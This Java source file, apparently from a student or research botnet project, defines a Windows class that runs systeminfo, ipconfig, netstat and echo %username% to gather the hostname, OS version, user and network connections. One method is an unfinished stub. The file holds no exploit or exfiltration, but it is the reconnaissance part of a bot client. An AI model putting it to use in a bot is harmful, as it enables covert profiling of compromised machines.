/*
  The MIT License (MIT)

  Copyright (c) 2017 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.tool.runtime;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.StringReader;

public class WindowsSysInfoTools {
	
	//to do
	
	/**
	 * Returns the kernel version of the system
	 * @return kernel Version
	 */
	public String getKernelVersion(){
		String SPSDT = RunCmdTool.runCmd("systeminfo");
		String kernelVersion = "";
		BufferedReader reader = new BufferedReader(new StringReader(SPSDT));
		String lines;
		try {
			while ((lines = reader.readLine()) != null)  {
				if (lines.length() > 0){
					if(lines.contains("Versione SO:"))
						kernelVersion = lines.substring(lines.indexOf("Versione SO:")).replace("Versione SO:", "");;
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

		return kernelVersion;
	}
	
	/**
	 * Returns the name of the host
	 * @return hostname
	 */
	public String getHostName(){
		String SPSDT = RunCmdTool.runCmd("systeminfo");
		String hostName = "";
		BufferedReader reader = new BufferedReader(new StringReader(SPSDT));
		String lines;
		try {
			while ((lines = reader.readLine()) != null)  {
				if (lines.length() > 0){
					if(lines.contains("Nome host:"))
						hostName = lines.substring(lines.indexOf("Nome host:")).replace("Nome host:", "");
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		return hostName;
	}
	
	/**
	 * Returns the username of the active user on the system
	 * @return username
	 */
	public String getUserName(){
		return RunCmdTool.runCmd("echo %username%");
	}
	
	/**
	 * Returns info of the network it is connected to the system
	 * @return network info
	 */
	public String getCurrentNetworkInformation(){
		return RunCmdTool.runCmd("ipconfig");
	}
	
	/**
	 * Returns all protocol network statistics: 
	 * @return network statistics
	 */
	public String getAllNetworkStatistics(){
		return RunCmdTool.runCmd("netstat -s");
	}
	
	/**
	 * Returns the tcp current active connections
	 * @return tcp connections
	 */
	public String getTCPCurrentConnections(){
		return RunCmdTool.runCmd("netstat -p tcp");
	}
	
	/**
	 * Returns the UDP current active connections
	 * @return udp connections
	 */
	public String getUDPCurrentConnections(){
		return RunCmdTool.runCmd("netstat -p udp");
	}
	
	/**
	 * Returns the list of browsers installed on the system
	 * @return browsers list
	 */
	public String getBrowsers(){
		return RuntimeManager.runCmd("");
	}	
}